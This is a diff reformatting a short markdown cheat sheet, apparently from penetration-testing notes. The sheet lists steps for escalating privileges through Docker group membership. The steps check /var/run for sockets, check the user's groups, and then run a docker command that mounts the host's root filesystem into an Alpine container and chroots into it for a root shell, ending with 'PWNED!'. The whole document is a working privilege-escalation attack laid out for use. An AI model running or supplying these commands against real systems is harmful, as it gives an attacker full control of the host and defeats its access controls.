@@ -6,16 +6,24 @@
 
 ## STEPS:
 
-#### 1) cd /var/run
+#### 1) 
 
-#### 2) ls -la | grep sock
+    cd /var/run
 
-#### 3) id/groups
+#### 2) 
+
+    ls -la | grep sock
+
+#### 3) 
+
+    id/groups
 
 #### If user has permissions to run docker commands then we:
 
 #### 4) Mount host volumes (Download an alpine image to host)
 
-#### 5) docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+#### 5) 
+
+    docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
 #### 6) PWNED!
